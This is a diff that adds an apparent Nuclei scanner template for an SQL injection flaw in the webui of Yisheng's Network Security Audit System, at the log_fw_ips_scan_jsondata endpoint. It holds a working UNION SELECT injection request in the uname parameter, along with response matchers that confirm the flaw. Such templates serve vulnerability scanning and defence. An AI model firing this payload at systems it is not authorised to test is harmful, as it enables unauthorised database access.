@@ -1,0 +1,33 @@
+id: yisheng-audit-wehui-sqli
+
+info:
+  name: Yisheng - Network Security Audit System webui - SQL Injection
+  author: qwtd
+  severity: critical
+  description: |-
+    Yisheng - Network Security Audit System webui contains a SQL injection vulnerability.
+  reference:
+    - https://wiki.wy876.cn/#/./%E4%BB%BB%E5%AD%90%E8%A1%8C/%E4%BB%BB%E5%AD%90%E8%A1%8C%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1%E7%B3%BB%E7%BB%9Flog_fw_ips_scan_jsondata%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E
+  tags: 任子行网络安全审计系统
+
+http:
+  - raw:
+      - |
+        GET /webui/?g=log_fw_ips_scan_jsondata&uname='+union+select+sqlite_version(),2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--+ HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+        Accept-Encoding: gzip, deflate
+        Connection: close
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
+    
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - 'log_pri'
+          - 'log_time'
+          - 'ips_uname'
+      - type: status
+        status:
+          - 200
+
